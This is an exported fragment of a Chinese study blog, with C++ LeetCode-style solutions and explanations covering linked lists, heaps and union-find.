<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">swapPairs</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        ListNode* dummyHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>();</span><br><span class="line">        dummyHead-&gt;next = head;</span><br><span class="line">        ListNode* cur = dummyHead;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (cur-&gt;next &amp;&amp; cur-&gt;next-&gt;next) &#123;</span><br><span class="line">            <span class="comment">// 满足该节点后有两个结点</span></span><br><span class="line"></span><br><span class="line">            ListNode* temp1 = cur-&gt;next-&gt;next;<span class="comment">//创建一个temp1指向要被交换的第二个结点</span></span><br><span class="line">            cur-&gt;next-&gt;next = temp1-&gt;next;<span class="comment">//不创建temp1的话在这步执行完之后就会丢失temp1</span></span><br><span class="line">            temp1-&gt;next = cur-&gt;next;</span><br><span class="line">            cur-&gt;next = temp1;</span><br><span class="line">            cur = cur-&gt;next-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummyHead-&gt;next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="19-删除链表的倒数第-N-个结点"><a href="#19-删除链表的倒数第-N-个结点" class="headerlink" title="19. 删除链表的倒数第 N 个结点"></a><a href="https://leetcode.cn/problems/remove-nth-node-from-end-of-list/">19. 删除链表的倒数第 N 个结点</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011130529.png" alt="image-20241001113017474"></p>
<p>思路：本题是需要虚拟头结点的，因为万一要删除第一个元素，没有虚拟头就结点不好处理了</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">removeNthFromEnd</span><span class="params">(ListNode* head, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        ListNode* dummyHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>();</span><br><span class="line">        dummyHead-&gt;next = head;</span><br><span class="line">        ListNode* fast = dummyHead;</span><br><span class="line">        ListNode* cur = dummyHead;</span><br><span class="line">        <span class="comment">// 让fast先走n步,这样当fast-&gt;next==NULL的时候，cur刚好指向要被删除结点的前驱结点</span></span><br><span class="line">        <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">            fast = fast-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (fast-&gt;next) &#123;</span><br><span class="line"></span><br><span class="line">            fast = fast-&gt;next;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListNode* temp = cur-&gt;next;</span><br><span class="line">        cur-&gt;next = cur-&gt;next-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> temp;</span><br><span class="line">        <span class="keyword">return</span> dummyHead-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="141-环形链表"><a href="#141-环形链表" class="headerlink" title="141. 环形链表"></a><a href="https://leetcode.cn/problems/linked-list-cycle/">141. 环形链表</a></h4><p>思路：继续采用虚拟头结点避免只有一个或者0个结点的单独判断</p>
<p>快慢指针fast和slow，fast一次走两步，slow一次走一步，如果有环那么fast和slow一定会相遇，否则while循环会结束并返回无环</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        ListNode* dummyHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>, head);</span><br><span class="line">        ListNode* fast = dummyHead;</span><br><span class="line">        ListNode* slow = dummyHead;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (fast-&gt;next &amp;&amp; fast-&gt;next-&gt;next) &#123;</span><br><span class="line">            fast = fast-&gt;next-&gt;next;</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">            <span class="keyword">if</span> (fast == slow) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="142-环形链表-II"><a href="#142-环形链表-II" class="headerlink" title="142. 环形链表 II"></a><a href="https://leetcode.cn/problems/linked-list-cycle-ii/">142. 环形链表 II</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011131946.png" alt="image-20241001113112875"></p>
<p>思路：快慢指针思路和上题一样，但是本题的难点在于寻找入环的第一个结点</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202409282209693.jpeg" alt="微信图片_20240926102153"></p>
<p>如图所示，相遇的时候slow走了x+y步，fast走了x+y+z+y步，得到x=</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">detectCycle</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">       ListNode* dummyHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>, head);</span><br><span class="line">       ListNode* fast = dummyHead;</span><br><span class="line">       ListNode* slow = dummyHead;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">while</span> (fast-&gt;next &amp;&amp; fast-&gt;next-&gt;next) &#123;</span><br><span class="line">           fast = fast-&gt;next-&gt;next;</span><br><span class="line">           slow = slow-&gt;next;</span><br><span class="line">           <span class="keyword">if</span> (fast == slow) &#123;</span><br><span class="line">               ListNode* index1 = dummyHead;</span><br><span class="line">               ListNode* index2 = slow;</span><br><span class="line">               <span class="keyword">while</span> (index1 != index2) &#123;</span><br><span class="line">                   index1 = index1-&gt;next;</span><br><span class="line">                   index2 = index2-&gt;next;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">return</span> index1;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>遗留问题：为什么在转一圈内相遇的公式可以适用于很多圈再相遇</p>
</blockquote>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>堆</title>
    <url>/2024/10/06/%E5%A0%86/</url>
    <content><![CDATA[<h1 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h1><p>在前面的排序中学习堆排序的过程中学习了堆</p>
<h4 id="2208-将数组和减半的最少操作次数"><a href="#2208-将数组和减半的最少操作次数" class="headerlink" title="2208. 将数组和减半的最少操作次数"></a><a href="https://leetcode.cn/problems/minimum-operations-to-halve-array-sum/">2208. 将数组和减半的最少操作次数</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410061525061.png" alt="image-20241006152507958"></p>
<p>这题很自然的就是贪心+大根堆的思路,这里自己实现一下堆</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">heapInsert</span><span class="params">(vector&lt;<span class="keyword">double</span>&gt;&amp; heap, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 向上调整</span></span><br><span class="line">        <span class="keyword">while</span> (heap[i] &gt; heap[(i - <span class="number">1</span>) / <span class="number">2</span>]) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(heap[i], heap[(i - <span class="number">1</span>) / <span class="number">2</span>]);</span><br><span class="line">            i = (i - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">heapify</span><span class="params">(vector&lt;<span class="keyword">double</span>&gt;&amp; heap, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 向下调整</span></span><br><span class="line">        <span class="keyword">int</span> size = heap.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> l = i * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> best = i; <span class="comment">// 找它的好儿子</span></span><br><span class="line">        <span class="keyword">while</span> (l &lt; size) &#123;</span><br><span class="line">            <span class="comment">// 是分支节点</span></span><br><span class="line">            <span class="keyword">if</span> (l + <span class="number">1</span> &lt; size) &#123;</span><br><span class="line">                <span class="comment">// 有两个孩子</span></span><br><span class="line">                best = heap[l] &gt; heap[l + <span class="number">1</span>] ? l : l + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 只有左孩子</span></span><br><span class="line">                best = l;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (heap[best] &gt; heap[i]) &#123;</span><br><span class="line">                <span class="built_in">swap</span>(heap[best], heap[i]);</span><br><span class="line">                i = best;</span><br><span class="line">                l = i * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(vector&lt;<span class="keyword">double</span>&gt;&amp; heap, <span class="keyword">double</span> num)</span> </span>&#123;</span><br><span class="line">        heap.<span class="built_in">push_back</span>(num);</span><br><span class="line">        <span class="built_in">heapInsert</span>(heap, heap.<span class="built_in">size</span>() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">pop</span><span class="params">(vector&lt;<span class="keyword">double</span>&gt;&amp; heap)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">double</span> res = heap[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">swap</span>(heap[<span class="number">0</span>], heap[heap.<span class="built_in">size</span>() - <span class="number">1</span>]);</span><br><span class="line">        heap.<span class="built_in">pop_back</span>();</span><br><span class="line">        <span class="built_in">heapify</span>(heap, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">halveArray</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">double</span>&gt; heap;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">double</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">double</span> halfSum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="built_in">push</span>(heap, (<span class="keyword">double</span>)nums[i]);</span><br><span class="line">            sum += (<span class="keyword">double</span>)nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        halfSum = sum / <span class="number">2.0</span>;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (sum &gt; halfSum) &#123;</span><br><span class="line">            res++;</span><br><span class="line">            <span class="keyword">double</span> temp = <span class="built_in">pop</span>(heap);</span><br><span class="line">            sum -= temp / <span class="number">2.0</span>;</span><br><span class="line">            <span class="built_in">push</span>(heap, temp / <span class="number">2.0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="1845-座位预约管理系统"><a href="#1845-座位预约管理系统" class="headerlink" title="1845. 座位预约管理系统"></a><a href="https://leetcode.cn/problems/seat-reservation-manager/">1845. 座位预约管理系统</a></h4><p>这题用小根堆,保证每次预约的都是最小的</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SeatManager</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cmp</span> &#123;</span></span><br><span class="line">        <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">int</span>&amp; a, <span class="keyword">int</span>&amp; b)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> a &gt; b; <span class="comment">// 好奇怪,为什么小根堆是大于号......</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    priority_queue&lt;<span class="keyword">int</span>, vector&lt;<span class="keyword">int</span>&gt;, cmp&gt; pq;</span><br><span class="line">    <span class="built_in">SeatManager</span>(<span class="keyword">int</span> n) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            pq.<span class="built_in">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">reserve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res = pq.<span class="built_in">top</span>();</span><br><span class="line">        pq.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">unreserve</span><span class="params">(<span class="keyword">int</span> seatNumber)</span> </span>&#123; pq.<span class="built_in">push</span>(seatNumber); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your SeatManager object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * SeatManager* obj = new SeatManager(n);</span></span><br><span class="line"><span class="comment"> * int param_1 = obj-&gt;reserve();</span></span><br><span class="line"><span class="comment"> * obj-&gt;unreserve(seatNumber);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>并查集</title>
    <url>/2024/10/09/%E5%B9%B6%E6%9F%A5%E9%9B%86/</url>
    <content><![CDATA[<h1 id="并查集"><a href="#并查集" class="headerlink" title="并查集"></a>并查集</h1><h5 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h5><p>对于并查集来说,最基本的三个操作就是</p>
<ol>
<li>find()</li>
<li>isSameSet();</li>
<li>union</li>
</ol>
<p>其中isSameSet和union都需要用到find(),主要优化的过程在find和union中</p>
<p>最基础的两个数组</p>
<ol>
<li>father数组,记录每个元素指向的父亲,初始都指向自己</li>
<li>size数组,记录每个集合的元素个数,初始情况下都为1,也就是自己一个人是一个集合</li>
</ol>
<h5 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h5><p><strong>扁平化</strong></p>
<p>在find中需要进行扁平化的操作,也就是在向上查找的过程中,把路过的结点都直接挂到最上层的结点,减少高度</p>
<p>可以用两种方式</p>
<ol>
<li>采用递归的方式,到顶了递归返回顶的值,然后利用递归返回值修改经过的节点</li>
<li>用一个path记录经过的结点,找到顶之后再逐个修改</li>
</ol>
<p><strong>小挂大</strong></p>
<p>也就是在union的时候,保持小的集合挂到大的集合上面</p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="并查集的实现"><a href="#并查集的实现" class="headerlink" title="并查集的实现"></a><a href="https://www.nowcoder.com/practice/e7ed657974934a30b2010046536a5372">并查集的实现</a></h4><p>这题时间要求有点高,只能用数组操作,不能用vector</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410091230185.png" alt="image-20241009123022121"></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> father[], <span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//扁平化</span></span><br><span class="line">    <span class="comment">//这里可以递归调用</span></span><br><span class="line">    <span class="comment">//也可以用path记录再逐个修改father对应的值</span></span><br><span class="line">    <span class="keyword">if</span> (num != father[num]) &#123;</span><br><span class="line">        father[num] = <span class="built_in">find</span>(father, father[num]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> father[num];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isSameSet</span><span class="params">(<span class="keyword">int</span> father[], <span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">find</span>(father, a) == <span class="built_in">find</span>(father, b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unionSet</span><span class="params">(<span class="keyword">int</span> father[], <span class="keyword">int</span> size[], <span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fa = <span class="built_in">find</span>(father, a);</span><br><span class="line">    <span class="keyword">int</span> fb = <span class="built_in">find</span>(father, b);</span><br><span class="line">    <span class="keyword">if</span> (fa != fb) &#123;</span><br><span class="line">        <span class="keyword">if</span> (size[fa] &lt; size[fb]) &#123;</span><br><span class="line">            <span class="comment">//小挂大</span></span><br><span class="line">            father[fa] = fb;</span><br><span class="line">            size[fb] += size[fa];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            father[fb] = fa;</span><br><span class="line">            size[fa] += size[fb];</span><br><span class="line">        &#125;</span><br><span class="line">        father[fa] = father[fb];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, m;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">int</span> father[<span class="number">1000003</span>];</span><br><span class="line">    <span class="keyword">int</span> size[<span class="number">1000003</span>] = &#123;<span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        father[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> opt, b, c;</span><br><span class="line">    <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">        cin &gt;&gt; opt;</span><br><span class="line">        <span class="keyword">if</span> (opt == <span class="number">1</span>) &#123;</span><br><span class="line">            cin &gt;&gt; b &gt;&gt; c;</span><br><span class="line">            <span class="keyword">bool</span> res = <span class="built_in">isSameSet</span>(father, b, c);</span><br><span class="line">            <span class="keyword">if</span> (res) &#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;Yes&quot;</span> &lt;&lt; endl;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;No&quot;</span> &lt;&lt; endl;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opt == <span class="number">2</span>) &#123;</span><br><span class="line">            cin &gt;&gt; b &gt;&gt; c;</span><br><span class="line">            <span class="built_in">unionSet</span>(father, size, b, c);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
</search>
